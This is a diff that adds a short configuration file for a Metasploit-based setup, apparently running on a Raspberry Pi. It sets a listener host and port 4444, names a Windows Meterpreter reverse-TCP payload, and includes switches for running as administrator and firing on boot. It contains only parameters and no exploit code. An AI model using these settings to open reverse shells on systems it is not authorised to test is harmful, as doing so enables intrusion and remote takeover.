@@ -1,0 +1,14 @@
+# ==========================
+# Custom Variables for setup.cfg
+# ==========================
+$MSFPATH=/home/pi/metasploit-framework
+
+LHOST=$IF_IP
+LPORT=4444
+PAYLOAD="windows/meterpreter/reverse_tcp"
+URIPATH=""
+
+START_AS_ADMIN=false
+FIRE_ON_BOOT=false
+
+DELAY_TIME=500
